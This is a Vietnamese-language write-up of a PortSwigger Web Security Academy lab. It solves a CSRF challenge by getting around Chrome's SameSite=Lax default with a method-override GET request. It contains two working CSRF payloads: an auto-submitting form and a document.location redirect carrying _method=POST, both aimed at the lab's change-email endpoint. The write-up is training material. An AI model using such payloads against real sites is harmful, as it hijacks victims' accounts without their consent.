### Web Academy PortSwigger
* Lab: [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)
* Descript: This lab's change email function is vulnerable to CSRF.
* To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
* Solved and Writeup by Me ^^!

![Ảnh chụp màn hình 2023-12-05 141055](https://hackmd.io/_uploads/BkgBkP3Sp.png)

Truy cập Lab , ta có giao diện như sau: 

![Ảnh chụp màn hình 2023-12-05 141420](https://hackmd.io/_uploads/rJRI1v2H6.png)

Vào đăng nhập vơí user wiener , chặn request và xem xét:

![Ảnh chụp màn hình 2023-12-05 141455](https://hackmd.io/_uploads/SJowkDhra.png)

![Ảnh chụp màn hình 2023-12-05 141624](https://hackmd.io/_uploads/H1VqyvhBp.png)

Ta thấy có vẻ như không có cơ chế bảo vệ CSRF , sau khi tải payload đơn giản sau lên exploit server, email được thay đổi như bên trên:  
```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0ac7006c036ff84b80f51c6500ad003e.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="abc123&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>
```
Sau một hồi tìm tòi , ta thử lại cách trên trong Chrome ( Trước đó là trên FOX browser), kết quả là bị log out ra và đưa tới trang login.
Nguyên do là trình duyệt Chrome tự động thêm thuộc tính mặc định SameSite: Lax 

*Nói thêm về cơ chế SameSite: Lax :Trong trường hợp có request chéo trang (cross-site),  Cookies Session không được bao gồm trong POST request, cũng như được tạo bởi Script , Iframe, Image,..==> do vậy , hạn chế được các cuộc tấn công CSRF , nhưng cũng hạn chế một số chức năng.*

Do đó , dựa theo đề bài có nội dung override method , ta tạo một đoạn html nhằm sử dụng chức năng thay đổi email sau : 

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      document.location = "https://0ac7006c036ff84b80f51c6500ad003e.web-security-academy.net/my-account/change-email?email=trantung1
      @gmail.com&_method=POST";
    </script>
  </body>
</html>
```
![Ảnh chụp màn hình 2023-12-05 160511](https://hackmd.io/_uploads/B1yAYv2ST.png)


Presss Deliver to Victim , and View exploit 
and.... Lab Solved






